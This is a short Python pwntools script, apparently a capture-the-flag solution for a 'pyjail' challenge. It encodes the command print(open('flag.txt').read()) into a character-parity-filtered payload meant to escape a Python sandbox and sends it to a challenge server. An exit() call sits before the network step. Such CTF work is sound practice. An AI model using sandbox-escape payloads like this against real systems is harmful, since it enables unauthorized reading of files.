from pwn import *

inp = "print(open('flag.txt').read())"


def payload(inp):
    ans = ""
    for i in range(len(inp)):
        v = ord(inp[i])
        if i % 2 == 0:
            if v % 2 == 1:
                ans += '\00' + chr(v)
                i += 2
                continue
            ans += chr(v)
        if i % 2 == 1:
            if v % 2 == 0:
                ans += '\01' + chr(v)
                i += 2
                continue
            ans += chr(v)
        print(ans)

    return ans


ans = payload(inp)

# Verify the output
for i in ans:
    x = ord(i) % 2
    print(f"Character: {repr(i)}, Ordinal: {ord(i)}, Mod 2: {x}")

# For demonstration purposes, printing the final payload
print("Final payload for eval:", repr(ans))

exit()
print(ans)
host = "challs2.pyjail.club"
port = 7991
r = remote(host, port)

conn = r.recv(1024)
print("Result: ", conn.decode())

ans = ans.encode('utf-8')
print(ans)
r.sendline(ans)

data = r.recv(1024)
print(f"got: {data.decode()}")

r.close()
